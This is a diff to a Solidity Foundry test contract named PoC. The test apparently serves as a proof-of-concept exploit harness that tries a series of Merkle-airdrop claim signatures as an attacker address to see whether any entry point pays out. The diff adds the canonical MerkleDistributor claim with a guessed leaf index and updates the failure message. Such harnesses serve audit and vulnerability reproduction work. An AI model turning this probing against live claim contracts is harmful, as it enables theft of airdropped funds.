@@ -69,6 +69,11 @@ contract PoC is Test {
         if (used.length > 0) return used;
         used = _claimOnce(claimant, before, "withdraw(uint256,bytes32[])", abi.encodeWithSignature("withdraw(uint256,bytes32[])", AMOUNT, proof));
         if (used.length > 0) return used;
+        // The canonical MerkleDistributor order: (index, account, amount,
+        // proof). The leaf index is not a template constant — 0 is the
+        // sweep guess; an adapter with the real leaf adapts this call.
+        used = _claimOnce(claimant, before, "claim(uint256,address,uint256,bytes32[])", abi.encodeWithSignature("claim(uint256,address,uint256,bytes32[])", uint256(0), claimant, AMOUNT, proof));
+        if (used.length > 0) return used;
         return "";
     }
 
@@ -82,7 +87,7 @@ contract PoC is Test {
         bytes memory used = _tryClaim(attackerEOA, before);
         require(
             used.length > 0,
-            "no claim entry point paid the attacker. Tried claim(bytes32[],uint256), claim(uint256,bytes32[]), claim(bytes,uint256), redeem(uint256,bytes32[]), withdraw(uint256,bytes32[]). This does NOT establish safety: the claim signature, proof or amount may differ."
+            "no claim entry point paid the attacker. Tried claim(bytes32[],uint256), claim(uint256,bytes32[]), claim(bytes,uint256), redeem(uint256,bytes32[]), withdraw(uint256,bytes32[]), claim(uint256,address,uint256,bytes32[]) (leaf index 0). This does NOT establish safety: the claim signature, proof, amount or leaf index may differ."
         );
         uint256 afterFirst = _valueOf(attackerEOA);
         require(afterFirst > before, "the claim returned but paid nothing");
